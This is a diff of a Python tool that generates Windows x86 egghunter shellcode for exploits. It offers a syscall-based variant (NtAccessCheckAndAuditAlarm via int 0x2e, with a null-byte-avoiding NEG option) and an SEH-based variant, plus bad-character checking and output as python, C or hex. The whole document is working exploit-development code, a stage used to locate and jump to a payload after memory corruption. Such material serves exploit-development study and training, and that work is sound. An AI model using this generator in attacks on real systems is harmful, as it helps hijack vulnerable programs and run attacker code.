@@ -1,231 +1,202 @@
-# call example python egghunter_generator.py --egg w00t --ntaccess 1c6 --egghunter
+#!/usr/bin/env python3
+"""
+Egghunter Generator Modular Tool  -  v1.2 (17‑Jul‑2025)
 
-import sys
-import os
+  old : syscall + int 0x2e (Windows XP/7) con opcion --negate
+  seh : SEH‑based (Windows 10+)
+
+Extra Options:
+    Output Formats: python | c | hex
+    Badchar Checker: -b "\x00\x0a"
+    Save to File: -o output.txt
+"""
+
 import argparse
-from keystone import *
+import sys
+from keystone import Ks, KS_ARCH_X86, KS_MODE_32
 
-OUTPUT_PATH = None
-ARGS = None
+# utils
+def format_shellcode(buf: bytes, fmt: str = "python") -> str:
+    if fmt == "python":
+        return format_python_egghunter(buf)
+    if fmt == "c":
+        return "unsigned char egghunter[] = { " + ','.join(f"0x{b:02x}" for b in buf) + " };"
+    if fmt == "hex":
+        return ''.join(f"{b:02x}" for b in buf)
+    raise ValueError("Format not supported")
 
-def setup_arguments():
-    parser = argparse.ArgumentParser(description='EggHunter Generator.')
-    parser.add_argument('--egghunter', action='store_true', help='Enable egg hunter mode.')
-    parser.add_argument('--egg', help='Egg to use with the egg hunter, must be exactly 4 characters long.')
-    parser.add_argument('--seh', action='store_true', help='Use SEH based egg hunter.')
-    parser.add_argument('--ntaccess', help='Use NTACCESS based egg hunter, requires a value.')
-    parser.add_argument('--nopbefore', type=int, default=0, help="Number of Nops to add before the Egghunter.")
-    parser.add_argument('--nopafter', type=int, default=0, help="Number of Nops to add after the Egghunter.")
-    parser.add_argument('-o', '--output', help='Output file of the founded results, e.x: -o "C:\\output.txt".')
-    return parser.parse_args()
 
-def calculate_negated_syscall(syscall_num):
-    syscall_int = int(syscall_num, 16)
-    negated_syscall = 0x100000000 - syscall_int
-    return format(negated_syscall, '08x')
+def format_python_egghunter(buf: bytes) -> str:
+    lines = ['egghunter = b""']
+    for idx in range(0, len(buf), 12):
+        block = buf[idx:idx + 12]
+        block_hex = ''.join(f"\\x{b:02x}" for b in block)
+        lines.append(f'egghunter += b"{block_hex}"')
+    return "\n".join(lines)
 
-def string_to_hex(str_value):
-    return ''.join(format(ord(c), '02x') for c in str_value)
 
-def to_little_endian(hex_string):
-    byte_array = bytes.fromhex(hex_string)
-    little_endian_bytes = byte_array[::-1]
-    little_endian_hex = little_endian_bytes.hex()
-    return little_endian_hex
+def parse_badchars_string(s: str) -> bytes:
+    s = s.replace(' ', '').lower()
+    if not s:
+        return b''
 
-def generate_egghunter(CODE):
+    if len(s) % 4 != 0 or not all(s[i:i + 2] == '\\x' for i in range(0, len(s), 4)):
+        raise ValueError
+
+    return bytes(int(s[i + 2:i + 4], 16) for i in range(0, len(s), 4))
+
+
+def parse_syscall_id(s: str) -> int:
+    try:
+        return int(s, 0)
+    except ValueError:
+        raise argparse.ArgumentTypeError('Syscall ID must be hex like 0x1C9')
+
+
+def check_badchars(buf: bytes, bad: bytes):
+    return [(i, b) for i, b in enumerate(buf) if b in bad]
+
+
+def assemble(asm: str) -> bytes:
+    # remove every no-ASCII char
+    asm_clean = asm.encode('ascii', 'ignore').decode()
     ks = Ks(KS_ARCH_X86, KS_MODE_32)
-    encoding, count = ks.asm(CODE)
-    instructions = ""
-    for dec in encoding:
-        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
-    return (encoding, instructions)
+    encoding, _ = ks.asm(asm_clean)
+    return bytes(encoding)
 
-def egghunter_seh(egg):
-    nop_count_before = ARGS.nopbefore
-    nop_count_after = ARGS.nopafter
 
-    if not egg or len(egg) != 4:
-        print("[!] The EGG must be provided and be exactly 4 characters long.")
-        return
 
-    hex_word = string_to_hex(egg)
-    little_endian = to_little_endian(hex_word)
-
-    CODE = (
-        "	start: 									 "
-        "		jmp get_seh_address 				;"
-        "	build_exception_record: 				 "
-        "		pop ecx 							;"
-        f"		mov eax, 0x{little_endian}			;"
-        "		push ecx 							;"
-        "		push 0xffffffff 					;"
-        "		xor ebx, ebx 						;"
-        "		mov dword ptr fs:[ebx], esp 		;"
-        "	is_egg: 								 "
-        "		push 0x02 							;"
-        "		pop ecx 							;"
-        "		mov edi, ebx 						;"
-        "		repe scasd 							;"
-        "		jnz loop_inc_one 					;"
-        "		jmp edi 							;"
-        "	loop_inc_page: 							 "
-        "		or bx, 0xfff 						;"
-        "	loop_inc_one: 							 "
-        "		inc ebx 							;"
-        "		jmp is_egg 							;"
-        "	get_seh_address: 						 "
-        "		call build_exception_record 		;"
-        "		push 0x0c 							;"
-        "		pop ecx 							;"
-        "		mov eax, [esp+ecx] 					;"
-        "		mov cl, 0xb8						;"
-        "		add dword ptr ds:[eax+ecx], 0x06	;"
-        "		pop eax 							;"
-        "		add esp, 0x10 						;"
-        "		push eax 							;"
-        "		xor eax, eax 						;"
-        "		ret 								;"
-    )
-
-    encoding, instructions = generate_egghunter(CODE)
-
-    if nop_count_before > 0:
-        instructions = "\\x90" * nop_count_before + instructions
-    if nop_count_after > 0:
-        instructions += "\\x90" * nop_count_after
-
-    out = "[+] Egg Hunter generated successfully\n"
-    out += f"Egg Hunter size: {len(encoding)}\n"
-    out += f"Egg Hunter size with NOPs: {len(encoding) + nop_count_before + nop_count_after}\n"
-    out += f"Egg Hunter: egghunter = b\"{instructions}\""
-    return out
-
-def egghunter_nt(egg, ntaccess):
-    nop_count_before = ARGS.nopbefore
-    nop_count_after = ARGS.nopafter
-
-    if not egg or len(egg) != 4:
-        print("[!] The EGG must be provided and be exactly 4 characters long.")
-        return
-
-    hex_word = string_to_hex(egg)
-    little_endian = to_little_endian(hex_word)
-
-    CODE = (
-
-        "							 "
-        "	loop_inc_page:			 "
-        "		or dx, 0x0fff		;"
-        "	loop_inc_one:			 "
-        "		inc edx				;"
-        "	loop_check:				 "
-        "		push edx			;"
-        f"		push 0x{ntaccess} 			;"
-        "		pop eax				;"
-        "		int 0x2e			;"
-        "		cmp al,05			;"
-        "		pop edx				;"
-        "	loop_check_valid:		 "
-        "		je loop_inc_page	;"
-        "	is_egg:					 "
-        f"		mov eax, 0x{little_endian}	;"
-        "		mov edi, edx		;"
-        "		scasd				;"
-        "		jnz loop_inc_one	;"
-        "		scasd				;"
-        "		jnz loop_inc_one	;"
-        "	matched:				 "
-        "		jmp edi				;"
-    )
-
-    encoding, instructions = generate_egghunter(CODE)
-
-    # Check for null bytes
-    if "\\x00" in instructions:
-        print("[*] Null bytes detected in the egg hunter")
-        user_choice = input("[*] Do you want to use negated syscall to avoid null bytes? (Y/N): ").lower()
-        if user_choice == "y":
-            negated_syscall_hex = calculate_negated_syscall(ntaccess)
-            print(f"[+] Using negated syscall value: 0x{negated_syscall_hex}")
-            CODE = (
-
-                "							 "
-                "	loop_inc_page:			 "
-                "		or dx, 0x0fff		;"
-                "	loop_inc_one:			 "
-                "		inc edx				;"
-                "	loop_check:				 "
-                "		push edx			;"
-                f"		mov eax, 0x{negated_syscall_hex}	;"
-                "		neg eax				;"
-                "		int 0x2e			;"
-                "		cmp al,05			;"
-                "		pop edx				;"
-                "	loop_check_valid:		 "
-                "		je loop_inc_page	;"
-                "	is_egg:					 "
-                f"		mov eax, 0x{little_endian}	;"
-                "		mov edi, edx		;"
-                "		scasd				;"
-                "		jnz loop_inc_one	;"
-                "		scasd				;"
-                "		jnz loop_inc_one	;"
-                "	matched:				 "
-                "		jmp edi				;"
-            )
-            encoding, instructions = generate_egghunter(CODE)
-
-    # Adding NOPs if specified
-    if nop_count_before > 0:
-        instructions = "\\x90" * nop_count_before + instructions
-    if nop_count_after > 0:
-        instructions += "\\x90" * nop_count_after
-
-    out = "[+] Egg Hunter generated successfully\n"
-    out += f"Egg Hunter size: {len(encoding)}\n"
-    out += f"Egg Hunter size with NOPs: {len(encoding) + nop_count_before + nop_count_after}\n"
-    out += f"Egg Hunter: egghunter = b\"{instructions}\""
-    return out
-
-def save_output(data):
-    global OUTPUT_PATH
-    if OUTPUT_PATH:
-        try:
-            with open(OUTPUT_PATH, 'w', encoding='utf-8') as file:
-                file.write(data)
-            log(f"Output saved to {OUTPUT_PATH}")
-        except IOError as e:
-            log(f"Error writing to file: {e}")
+def build_old(tag: str, syscall_id: int, negate=False) -> bytes:    #classic generator
+    tag_hex = int.from_bytes(tag.encode('ascii'), 'little')
+    if negate:
+        syscall_neg = (-syscall_id) & 0xFFFFFFFF
+        mov_eax = f"mov eax, 0x{syscall_neg:08x}\nneg eax"
     else:
-        log("No output path provided. Printing to console:")
-        print(data)
+        mov_eax = f"push 0x{syscall_id:x}\npop eax"
 
-def log(msg):
-    print("[+] " + msg)
+    asm = f"""
+loop_inc_page:
+    or dx, 0x0fff
+loop_inc_one:
+    inc edx
+loop_check:
+    push edx
+{mov_eax}
+    int 0x2e
+    cmp al, 0x5
+    pop edx
+    je loop_inc_page
+is_egg:
+    mov eax, 0x{tag_hex:08x}
+    mov edi, edx
+    scasd
+    jnz loop_inc_one
+    scasd
+    jnz loop_inc_one
+match:
+    jmp edi
+"""
+    return assemble(asm)
 
-def run():
-    global ARGS, OUTPUT_PATH
-    ARGS = setup_arguments()
 
-    if ARGS.output:
-        if os.path.isdir(os.path.dirname(ARGS.output)):
-            OUTPUT_PATH = ARGS.output
-        else:
-            log("Invalid output path. Results will be printed to console.")
+def build_seh(tag: str) -> bytes: #seh egghunter generator
+    tag_be = tag.encode('ascii')[::-1]  # w00t -> little-endian reversed
+    asm = f"""
+jmp get_seh_address
+build_exception_record:
+    pop ecx
+    mov eax, 0x{tag_be.hex()}
+    push ecx
+    push 0xffffffff
+    xor ebx, ebx
+    mov dword ptr fs:[ebx], esp
+    sub ecx, 0x04
+    add ebx, 0x04
+    mov dword ptr fs:[ebx], ecx
+is_egg:
+    push 0x02
+    pop ecx
+    mov edi, ebx
+    repe scasd
+    jnz loop_inc_one
+    jmp edi
+loop_inc_page:
+    or bx, 0xfff
+loop_inc_one:
+    inc ebx
+    jmp is_egg
+get_seh_address:
+    call build_exception_record
+    push 0x0c
+    pop ecx
+    mov eax, [esp+ecx]
+    mov cl, 0xb8
+    add dword ptr ds:[eax+ecx], 0x06
+    pop eax
+    add esp, 0x10
+    push eax
+    xor eax, eax
+    ret
+"""
+    return assemble(asm)
 
-    if ARGS.egghunter:
-        if not ARGS.egg or len(ARGS.egg) != 4:
-            sys.exit('Egg (--egg) must be provided and be exactly 4 characters long.')
-        if not (ARGS.seh or ARGS.ntaccess):
-            sys.exit('Either --seh or --ntaccess must be used with --egghunter.')
 
-        if ARGS.seh:
-            data = egghunter_seh(ARGS.egg)
-            save_output(data)
-        if ARGS.ntaccess:
-            data = egghunter_nt(ARGS.egg, ARGS.ntaccess)
-            save_output(data)
+def main():
+    ap = argparse.ArgumentParser(description="Egghunter generator for Windows x86")
+    ap.add_argument("-t", "--tag", required=True, help="TAG (ej: w00t)")
+    ap.add_argument("-v", "--variant", choices=["old", "seh"], default="old")
+    ap.add_argument("-s", "--syscall", type=parse_syscall_id, default=0x2, help="Syscall ID hex string (e.g. 0x1C9)")
+    ap.add_argument("-n", "--negate", action="store_true", help="Use NEG to avoid null bytes")
+    ap.add_argument(
+        "-b",
+        "--badchars",
+        default="",
+        help=r'Badchars string (default: empty; example: "\x00\x0a")',
+    )
+    ap.add_argument("-f", "--format", choices=["python", "c", "hex"], default="python")
+    ap.add_argument("-o", "--outfile", help="Save to file")
+    args = ap.parse_args()
 
-if __name__ == '__main__':
-    run()
+    if len(args.tag) != 4 or not args.tag.isascii():
+        sys.exit("ERROR: TAG must be 4 chars wide ASCII.")
+
+    try:
+        bad = parse_badchars_string(args.badchars)
+    except ValueError:
+        sys.exit(r'ERROR: Badchars must use string format, e.g. -b "\x00\x0a\xff"')
+
+    if args.variant == "old":
+        sc = build_old(args.tag, args.syscall, args.negate)
+    else:
+        sc = build_seh(args.tag)
+
+    out = format_shellcode(sc, args.format)
+    bad_list = check_badchars(sc, bad)
+
+    hunter_type = "syscall" if args.variant == "old" else "seh"
+    print(f"\n[+] Egghunter created successfully!")
+    print(f"[=]   Type:          {hunter_type}")
+    print(f"[=]   TAG:           {args.tag}")
+    if args.variant == "old":
+        print(f"[=]   Syscall ID:    0x{args.syscall:X}")
+        print(f"[=]   NEG syscall:   {'yes' if args.negate else 'no'}")
+        print(f"[!]   check syscall in cdb.exe with: u ntdll!NtAccessCheckAndAuditAlarm")
+    print(f"[=]   Total len:     {len(sc)} bytes (0x{len(sc):x})")
+
+    if bad_list:
+        print(f"\n[!] Badchars detected:")
+        for off, b in bad_list:
+            print(f"  Offset {off:02}: \\x{b:02x}")
+    else:
+        print("[=]   Badchars:      clean")
+
+    print("\n" + out + "\n")
+
+    if args.outfile:
+        with open(args.outfile, "w") as f:
+            f.write(out)
+        print(f"[+] Saved to {args.outfile}")
+
+
+if __name__ == "__main__":
+    main()
